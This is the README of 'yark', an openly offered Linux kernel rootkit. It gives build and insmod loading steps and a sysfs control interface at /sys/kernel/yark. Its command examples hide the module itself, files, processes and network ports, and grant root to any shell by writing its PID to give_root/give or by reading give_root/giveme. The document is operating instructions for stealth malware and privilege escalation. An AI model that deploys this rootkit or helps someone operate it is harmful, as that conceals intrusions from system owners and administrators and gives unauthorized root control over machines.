# yark - Yet Another RootKit

## How to Build

### Requirements

In order to build the kernel module, you need to install the `kernel-headers` package corresponding to kernel version.

- For ubuntu:

    ```shell
    apt-get install build-essential linux-headers-`uname -r`
    ```

### Build

We use `Makefile` to manage the build flow.

- Build the kernel module:

    ```shell
    make
    ```

- Load kernel module on local machine

    ```shell
    sudo insmod yark.ko
    ```

- Uninstall kernel module

    ```shell
    sudo rmmod yark
    ```

- Clean up

    ```shell
    make clean
    ```

## Quick Start Guide

### control by file IO
    
We use the method of writing to the file to control the rookie, and the /sys/kernel/yark file will be automatically generated when the module is loaded.

The corresponding file structure is as follows.

```shell
├── yark
　　 ├── give_root
　　 │　   ├── give
　　 │　   └── giveme
　　 ├── hide_file 
　　 │　   ├── add
　　 │　   ├── del
　　 │　   └── list
　　 ├── hide_module
　　 │　   └── vis
　　 ├── hide_port
　　 │　   ├── add
　　 │　   ├── del
　　 │　   └── list
　　 └── hide_proc
　 　　　  ├── add
 　　　　  ├── del
　　　　   └── list
```

### hide module

hide_module controls the display status of the rookie module.

If 1 is written to `hide_module/vis`, the rookie module will be visible (default status), or if 0 is written, the rookie module will not be visible.

- e.g. If we want to hide the rookie module

    ```shell
        echo -n "0" > /sys/kernel/yark/hide_module/vis
    ```

### hide file

hide_file controls the hiding / unhidding status of specified file.

Writing amy file path to `hide_file/add` can hide the file, and writing the file path to `hide_file/del` can unhide it. `hide_file/list` records all the hidden files.

- e.g. If we want to hide file `/tmp/test_hide_file`

    ```shell
        echo -n "/home/chaos/Downloads/dist" > /sys/kernel/yark/hide_file/add
    ```

### hide process

hide_proc controls the hiding / unhidding status of specified process.

Writing any PID to `hide_proc/add` can hide the process, and writing the PID to `hide_proc/del` can unhide it. `hide_proc/list` records all the hidden processes.

- e.g. If we want to hide process with PID 1234

    ```shell
        echo -n "1234" > /sys/kernel/yark/hide_proc/add
    ```

### hide port

hide_port controls the hiding / unhidding status of network activity of the specified port.

Writing any port ID to `hide_port/add` can hide all the network activity of the specified port, and writing the port number to `hide_port/del` can unhide it. `hide_port/list` records all the hidden port.

- e.g. If we want to hide port with ID 80

    ```shell
        echo -n "80" > /sys/kernel/yark/hide_port/add
    ```

### privilege escalation

give_root can set any shell's UID to 0. (i.e. give_root can promote any shell's user to root)

Writing any shell's PID to `give_root/give` can set the shell's UID to 0. Reading `give_root/giveme` can change current shell's user to root.

- e.g. If we have a shell with PID 1234 and want to change its user to root

    ```shell
        echo -n "1234" > /sys/kernel/yark/give_root/give
    ```
- e.g. If we want to change current shell's user to root

    ```shell
        cat /sys/kernel/yark/give_root/giveme
    ```

## Development

### vscode configure

For developers using vscode, in order for vscode to know the kernel header files path, it is recommended to create a configuration file `.vscode/c_cpp_properties.json` that contains the following:

```json
{
    "env": {
        "kernel_release": "<your kernel version>"
    },
    "configurations": [
        {
            "name": "Linux",
            "defines": [
                "__GNUC__",
                "__KERNEL__"
            ],
            "includePath": [
                "${workspaceFolder}/**",
                "/lib/modules/${env:kernel_release}/build/include",
                "/usr/lib/modules/${env:kernel_release}/build/arch/x86/include/asm",
                "/usr/lib/modules/${env:kernel_release}/build/arch/x86/include",
                "/usr/lib/modules/${env:kernel_release}/build/arch/x86/include/generated",
                "/usr/lib/modules/${env:kernel_release}/build/include/uapi"
            ]
        }
    ],
    "version": 4
}
```

> Remember to change the value of `kernel_release` to the version of your kernel. You can query your kernel version with `uname -r`.

